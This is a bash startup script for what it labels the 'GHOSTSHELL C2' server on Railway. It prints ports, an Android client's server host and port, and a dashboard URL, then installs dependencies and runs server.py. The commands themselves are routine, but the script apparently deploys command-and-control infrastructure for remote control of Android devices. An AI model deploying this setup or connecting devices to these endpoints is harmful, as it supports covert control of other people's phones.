#!/bin/bash

echo "========================================="
echo "  GHOSTSHELL C2 - RAILWAY STARTUP"
echo "========================================="
echo ""
echo "📡 HTTP Port: ${PORT:-8080}"
echo "📡 TCP Port : 9090 (internal)"
echo ""
echo "📱 Android Config:"
echo "   SERVER_IP = mainline.proxy.rlwy.net"
echo "   SERVER_PORT = 37745"
echo ""
echo "🌐 Web Dashboard:"
echo "   https://web-production-aa67.up.railway.app"
echo ""
echo "📁 Checking files..."
echo ""

# Install dependencies
pip install -r requirements.txt

# Check if index.html exists
if [ -f "index.html" ]; then
    echo "✅ index.html found"
    mkdir -p templates
    cp index.html templates/
else
    echo "⚠️  index.html not found!"
    echo "📝 Current directory contents:"
    ls -la
fi

echo ""
echo "🚀 Starting Python server directly..."
echo ""

python server.py
